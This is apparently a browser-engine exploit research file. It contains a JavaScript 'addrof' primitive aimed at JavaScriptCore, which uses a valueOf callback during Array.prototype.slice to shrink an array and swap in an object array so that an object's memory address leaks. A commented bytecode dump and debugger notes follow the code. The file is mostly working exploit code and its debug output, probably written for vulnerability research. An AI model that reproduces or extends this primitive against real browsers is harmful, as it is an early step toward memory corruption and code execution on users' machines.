function addrof(object) {
    var a = [];
    for (var i = 0; i < 100; i++)
        a.push(i + 0.1337);

    var hax = {valueOf: function() {
        // br on JSArray::setLength
        // new address of beginning butterfly is 0x7fd0a81e62b8
        // void* to = result->propertyStorage() - propertyCapacity;
        a.length = 0;
        // br on slow_path_new_array
        a = [object];
        return 4;
    }};

    var b = a.slice(0, hax);
    print(b);
}

var x = {};
print(describe(x));
addrof(x);

/*
<global>#At3udn:[0x7fd0a6d9bc80->0x7fd0a6dfbf70, NoneGlobal, 152]: 152 m_instructions; 1216 bytes; 1 parameter(s); 20 callee register(s); 5 variable(s)
[   0] enter             
[   1] get_scope         loc3
[   3] mov               loc4, loc3
[   6] new_func          loc5, loc3, f0
[  10] resolve_scope     loc6, loc3, addrof(@id0), <GlobalVar>, 1, 0x7fd0a6de7900
[  17] mov               loc7, loc6
[  20] put_to_scope      loc7, addrof(@id0), loc5, 2049<ThrowIfNotFound|GlobalVar|NotInitialization>, <structure>, -392574040
[  27] mov               loc5, Undefined(const0)
[  30] resolve_scope     loc6, loc3, x(@id1), <GlobalVar>, 1, 0x7fd0a6de7900
[  37] new_object        loc7, 0
[  41] put_to_scope      loc6, x(@id1), loc7, 1048577<DoNotThrowIfNotFound|GlobalVar|Initialization>, <structure>, -392574032
[  48] resolve_scope     loc10, loc3, print(@id2), <GlobalProperty>, 1, 0x7fd0a6de7900
[  55] get_from_scope    loc6, loc10, print(@id2), 2048<ThrowIfNotFound|GlobalProperty|NotInitialization>, 152    predicting None
[  63] resolve_scope     loc14, loc3, describe(@id3), <GlobalProperty>, 1, 0x7fd0a6de7900
[  70] get_from_scope    loc11, loc14, describe(@id3), 2048<ThrowIfNotFound|GlobalProperty|NotInitialization>, 150    predicting None
[  78] resolve_scope     loc13, loc3, x(@id1), <GlobalVar>, 1, 0x7fd0a6de7900
[  85] get_from_scope    loc13, loc13, x(@id1), 2049<ThrowIfNotFound|GlobalVar|NotInitialization>, -392574032    predicting None
[  93] call              loc9, loc11, 2, 20 status(Could Take Slow Path)    Original; predicting None
[ 102] call              loc5, loc6, 2, 16 status(Could Take Slow Path)    Original; predicting None
[ 111] resolve_scope     loc10, loc3, addrof(@id0), <GlobalVar>, 1, 0x7fd0a6de7900
[ 118] get_from_scope    loc6, loc10, addrof(@id0), 2049<ThrowIfNotFound|GlobalVar|NotInitialization>, -392574040    predicting None
[ 126] resolve_scope     loc9, loc3, x(@id1), <GlobalVar>, 1, 0x7fd0a6de7900
[ 133] get_from_scope    loc9, loc9, x(@id1), 2049<ThrowIfNotFound|GlobalVar|NotInitialization>, -392574032    predicting None
[ 141] call              loc5, loc6, 2, 16 status(Could Take Slow Path)    Original; predicting None
[ 150] end               loc5

Identifiers:
  id0 = addrof
  id1 = x
  id2 = print
  id3 = describe

Constants:
   k0 = Undefined

Cell: 0x7fd0a6ddbf40 (0x7fd0a6dc0100:[Object, {}, NonArray, Proto:0x7fd0a6dc7ff0]), ID: 251
addrof#EI9AKp:[0x7fd0a6d9ba60->0x7fd0a6dc8b50, NoneFunctionCall, 159]: 159 m_instructions; 1272 bytes; 2 parameter(s); 20 callee register(s); 10 variable(s)
[   0] enter             
[   1] get_scope         loc3
[   3] mov               loc4, loc3
[   6] create_lexical_environment loc5, loc3, Cell: 0x7fd0a6de3dd0 (0x7fd0a6df7700:[SymbolTable, {}, NonArray, Leaf]), ID: 18(const0), Undefined(const1)
[  11] mov               loc3, loc5
[  14] put_to_scope      loc5, object(@id0), arg1, 2052<ThrowIfNotFound|LocalClosureVar|NotInitialization>, <structure>, 0
[  21] new_array         loc10, head0, 0
[  26] put_to_scope      loc5, a(@id1), loc10, 1048580<DoNotThrowIfNotFound|LocalClosureVar|Initialization>, <structure>, 1
[  33] mov               loc8, Int32: 0(const2)
[  36] jnless            loc8, Int32: 100(const3), 42(->78)
[  40] loop_hint         
[  41] get_from_scope    loc14, loc5, a(@id1), 2051<ThrowIfNotFound|ClosureVar|NotInitialization>, 1    predicting None
[  49] get_by_id         loc10, loc14, push(@id2)    predicting None
[  58] add               loc13, loc8, Double: 4593985070451970907, 0.133700(const4)
[  63] call              loc10, loc10, 2, 20 status(Could Take Slow Path)    Original; predicting None
[  72] inc               loc8
[  74] jless             loc8, Int32: 100(const3), -34(->40)
[  78] new_object        loc10, 1
[  82] new_func_exp      loc11, loc3, f0
[  86] put_by_id         loc10, valueOf(@id3), loc11, IsDirect|Bottom
[  95] mov               loc7, loc10
[  98] get_from_scope    loc14, loc5, a(@id1), 2051<ThrowIfNotFound|ClosureVar|NotInitialization>, 1    predicting None
[ 106] get_by_id         loc10, loc14, slice(@id4)    predicting None
[ 115] mov               loc13, Int32: 0(const2)
[ 118] mov               loc12, loc7
[ 121] call              loc6, loc10, 3, 20 status(Could Take Slow Path)    Original; predicting None
[ 130] resolve_scope     loc14, loc3, print(@id5), <GlobalProperty>, 2, 0x7fd0a6de7900
[ 137] get_from_scope    loc10, loc14, print(@id5), 2048<ThrowIfNotFound|GlobalProperty|NotInitialization>, 152    predicting None
[ 145] mov               loc13, loc6
[ 148] call              loc10, loc10, 2, 20 status(Could Take Slow Path)    Original; predicting None
[ 157] ret               Undefined(const1)

Identifiers:
  id0 = object
  id1 = a
  id2 = push
  id3 = valueOf
  id4 = slice
  id5 = print

Constants:
   k0 = Cell: 0x7fd0a6de3dd0 (0x7fd0a6df7700:[SymbolTable, {}, NonArray, Leaf]), ID: 18
   k1 = Undefined
   k2 = Int32: 0: in source as integer
   k3 = Int32: 100: in source as integer
   k4 = Double: 4593985070451970907, 0.133700: in source as double

valueOf#C7wiv2:[0x7fd0a6d9b840->0x7fd0a6dc8aa0, NoneFunctionCall, 66]: 66 m_instructions; 528 bytes; 1 parameter(s); 8 callee register(s); 6 variable(s)
[   0] enter             
[   1] get_scope         loc3
[   3] mov               loc4, loc3
[   6] resolve_scope     loc6, loc3, a(@id0), <ClosureVar>, 0, 0x7fd0a6de3dd0
[  13] get_from_scope    loc7, loc6, a(@id0), 2051<ThrowIfNotFound|ClosureVar|NotInitialization>, 1    predicting None
[  21] put_by_id         loc7, length(@id1), Int32: 0(const1), Bottom
[  30] resolve_scope     loc6, loc3, a(@id0), <ClosureVar>, 0, 0x7fd0a6de3dd0
[  37] resolve_scope     loc7, loc3, object(@id2), <ClosureVar>, 0, 0x7fd0a6de3dd0
[  44] get_from_scope    loc7, loc7, object(@id2), 2051<ThrowIfNotFound|ClosureVar|NotInitialization>, 0    predicting None
[  52] new_array         loc7, loc7, 1
[  57] put_to_scope      loc6, a(@id0), loc7, 1050627<DoNotThrowIfNotFound|ClosureVar|NotInitialization>, <structure>, 1
[  64] ret               Int32: 4(const2)

Identifiers:
  id0 = a
  id1 = length
  id2 = object

Constants:
   k0 = Cell: 0x7fd0a6de3cf0 (0x7fd0a6df7700:[SymbolTable, {}, NonArray, Leaf]), ID: 18
   k1 = Int32: 0: in source as integer
   k2 = Int32: 4: in source as integer
*/